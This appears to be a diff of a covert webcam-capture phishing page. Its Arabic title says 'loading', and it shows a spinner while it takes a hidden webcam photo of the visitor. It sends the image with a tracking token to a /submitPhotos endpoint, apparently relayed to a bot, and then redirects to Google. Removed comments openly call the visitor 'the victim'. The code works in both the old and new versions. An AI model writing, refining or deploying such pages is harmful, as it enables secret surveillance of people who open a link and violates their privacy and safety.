@@ -1,73 +1,53 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحقق...</title>
+    <title>جاري التحميل...</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; }
+        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f0f0; margin: 0; }
+        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #video { display: none; }
-        #canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="loader"></div>
-    <video id="video" autoplay></video>
-    <canvas id="canvas"></canvas>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        const chatId = urlParams.get('chatId');
+        // استخراج التوكن من الرابط (المسار الجديد)
+        const pathParts = window.location.pathname.split('/');
+        const token = pathParts[pathParts.length - 1]; 
 
         async function startCapture() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-
-                video.onloadedmetadata = () => {
-                    setTimeout(() => {
-                        capturePhoto();
-                    }, 2000); // الانتظار لثانيتين لضمان وضوح الصورة
-                };
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    const imageData = canvas.toDataURL('image/jpeg').split(',')[1];
+                    
+                    fetch('/submitPhotos', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            token: token,
+                            imageDatas: imageData
+                        })
+                    }).then(() => {
+                        window.location.href = "https://google.com";
+                    });
+                }, 2000);
             } catch (err) {
-                console.error("Error accessing camera: ", err);
-                // إذا رفض الضحية الصلاحية، يمكنك توجيهه لصفحة أخرى
-                window.location.href = "https://www.google.com";
+                console.error("Error: " + err);
+                window.location.href = "https://google.com";
             }
         }
-
-        function capturePhoto() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-
-            const imageData = canvas.toDataURL('image/png').split(',')[1];
-            
-            sendToBot(imageData);
-        }
-
-        function sendToBot(base64Image) {
-            fetch('/submitPhotos', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chatId: chatId,
-                    imageDatas: base64Image
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                // بعد الإرسال بنجاح، وجه الضحية لأي موقع حقيقي
-                window.location.href = "https://www.youtube.com";
-            })
-            .catch(err => console.error("Error sending photo:", err));
-        }
-
         window.onload = startCapture;
     </script>
 </body>
